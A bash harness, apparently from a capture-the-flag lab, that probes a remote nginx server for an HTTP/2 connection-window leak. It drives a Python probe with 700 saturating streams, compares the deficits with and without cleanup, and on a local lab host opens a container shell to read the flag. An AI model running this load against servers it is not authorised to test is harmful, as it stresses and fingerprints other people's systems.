#!/usr/bin/env bash
# Remote check for the nginx HTTP/2 connection-window leak - against a real
# host, not the local lab. No server log and no docker: the verdict comes only
# from frames the server sends back.
#
# Usage: ./attack.sh <ip> [port] [path]
#   ip    target host, e.g. 10.10.10.5
#   port  default 443
#   path  default /big.bin - a body of at least 4 MiB; streams x size must
#         exceed 2 GiB so the connection window actually saturates
#
# How it decides: the leak shows up in what stream cleanup does to the drifted
# window. 1.31.8 returns part of the charged window on cleanup, so the deficit
# left behind is far SMALLER with cleanup than without. A fixed build nets out
# even. Two runs, one ratio.

set -u
HERE=$(cd "$(dirname "$0")" && pwd)
HOST="${1:-}"
PORT="${2:-443}"
PATHX="${3:-/big.bin}"
STREAMS="${STREAMS:-700}"
STEP="${STEP:-2097152}"

say() { printf '\033[1;36m== %s\033[0m\n' "$*"; }
ok()  { printf '\033[1;32m[PASS]\033[0m %s\n' "$*"; }
bad() { printf '\033[1;31m[FAIL]\033[0m %s\n' "$*"; }
info(){ printf '\033[1;34m[ .. ]\033[0m %s\n' "$*"; }

[ -n "$HOST" ] || { bad "usage: ./attack.sh <ip> [port] [path]"; exit 2; }
BASE="https://$HOST:$PORT"

say "stage 1/6 preflight"
command -v python3 >/dev/null || { bad "python3 missing"; exit 1; }
ok "python3 $(python3 -c 'import sys;print("%d.%d"%sys.version_info[:2])')"
[ -f "$HERE/../poc/_vendor/h2/connection.py" ] || { bad "vendored h2 missing"; exit 1; }
ok "vendored h2 present"

say "stage 2/6 connectivity"
if ! timeout 6 bash -c "</dev/tcp/$HOST/$PORT" 2>/dev/null; then
    bad "$HOST:$PORT not reachable"
    if command -v docker >/dev/null 2>&1; then
        info "live containers - check the published port on the right:"
        docker ps --format '  {{.Names}} {{.Ports}}' 2>/dev/null | sed 's/^/  /' || true
    fi
    exit 1
fi
ok "tcp $HOST:$PORT open"

say "stage 3/6 TLS + HTTP/2"
PROTO=$(curl -sk --http2 -o /dev/null -w '%{http_version}' --max-time 8 "$BASE/" 2>/dev/null)
[ "$PROTO" = "2" ] && ok "HTTP/2 negotiated" \
    || { bad "expected HTTP/2, got '${PROTO:-none}'"; exit 1; }
VER=$(curl -skI --http2 --max-time 8 "$BASE/" 2>/dev/null | tr -d '\r' | grep -i '^server:' | grep -o 'nginx/[0-9][0-9.]*' | tail -1)
info "server: ${VER:-none} (informational - the probe decides)"

say "stage 4/6 payload"
SIZE=$(curl -sk --http2 --max-time 30 "$BASE$PATHX" 2>/dev/null | wc -c)
printf '  %s -> %s bytes\n' "$PATHX" "$SIZE"
if [ "$SIZE" -lt 4194304 ]; then
    bad "payload under 4 MiB - pick a bigger file with the path argument"; exit 1
fi
if [ $((SIZE * STREAMS)) -lt 2147483648 ]; then
    bad "$STREAMS x $SIZE is below the 2 GiB window - raise STREAMS"; exit 1
fi
ok "payload saturates the window"

say "stage 5/6 load without cleanup"
OUT1=$(timeout 400 python3 "$HERE/remote_leak.py" "$HOST" "$PORT" "$PATHX" "$STREAMS" 0 "$STEP" 0 2>&1)
echo "$OUT1" | sed 's/^/  /'
D_PLAIN=$(echo "$OUT1" | sed -n 's/^deficit \([0-9]*\).*/\1/p')
[ -n "$D_PLAIN" ] || { bad "probe produced no deficit"; exit 1; }

say "stage 6/6 load with cleanup"
OUT2=$(timeout 400 python3 "$HERE/remote_leak.py" "$HOST" "$PORT" "$PATHX" "$STREAMS" 1 "$STEP" 0 2>&1)
echo "$OUT2" | sed 's/^/  /'
D_RST=$(echo "$OUT2" | sed -n 's/^deficit \([0-9]*\).*/\1/p')
[ -n "$D_RST" ] || { bad "probe produced no deficit"; exit 1; }

# ratio in tenths, integer math, no bc
if [ "$D_RST" -gt 0 ]; then RATIO=$((D_PLAIN * 10 / D_RST)); else RATIO=0; fi
say "verdict"
printf '  without cleanup %s B, with cleanup %s B, ratio %s.%s\n' \
    "$D_PLAIN" "$D_RST" "$((RATIO / 10))" "$((RATIO % 10))"
info "1.31.8 returns window on cleanup -> ratio ~3.5"
info "fixed builds net out -> ratio ~1.0"
if [ "$RATIO" -ge 20 ]; then
    ok "cleanup returns a large part of the window - leak present"
    info "$HOST:$PORT runs a vulnerable nginx"

    # Local lab: drop the operator straight into the container, where the flag
    # lives in the bind-mounted data dir. Skipped for remote hosts and pipes.
    CNAME=""
    if command -v docker >/dev/null 2>&1; then
        CNAME=$(docker ps --filter "publish=$PORT" --format '{{.Names}}' 2>/dev/null | head -1)
    fi
    if [ -n "$CNAME" ] && [ -t 0 ] && [ -t 1 ] && [ "${NO_SHELL:-0}" != 1 ]; then
        info "entering $CNAME - 'cat flag.txt', Ctrl-D to leave"
        docker exec -it -w /opt/lab/data "$CNAME" sh || true
        exit 0
    fi
    if [ -n "$CNAME" ]; then
        info "shell: docker exec -it -w /opt/lab/data $CNAME sh"
        info "then: cat flag.txt"
    fi
    exit 0
fi
bad "cleanup hardly changes the deficit - build looks fixed or payload too small"
exit 1
